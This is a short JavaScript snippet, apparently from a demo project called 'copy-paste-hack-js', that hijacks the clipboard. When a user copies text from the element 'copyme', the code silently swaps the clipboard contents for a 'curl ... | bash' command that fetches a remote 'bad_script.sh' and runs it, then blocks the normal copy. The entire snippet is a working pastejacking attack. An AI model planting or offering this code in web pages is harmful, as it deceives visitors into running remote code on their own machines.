document.getElementById('copyme').addEventListener(
    'copy', function(e){
        e.clipboardData.setData('text/plain',
        'curl https://raw.githubusercontent.com/meblum/copy-paste-hack-js/master/bad_script.sh | bash\n');
        e.preventDefault();
        e.stopPropagation();
    }
)
